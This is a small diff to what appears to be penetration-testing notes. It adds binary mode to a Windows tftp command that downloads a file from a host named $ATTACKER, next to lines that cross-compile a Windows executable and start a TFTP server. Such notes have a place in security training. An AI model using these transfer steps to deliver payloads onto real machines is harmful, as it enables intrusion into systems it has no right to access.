@@ -133,7 +133,7 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 service atftpd start
 
 # Windows
-tftp $ATTACKER get /download/location /save/location
+tftp -i $ATTACKER get /download/location /save/location
 
 ```
 
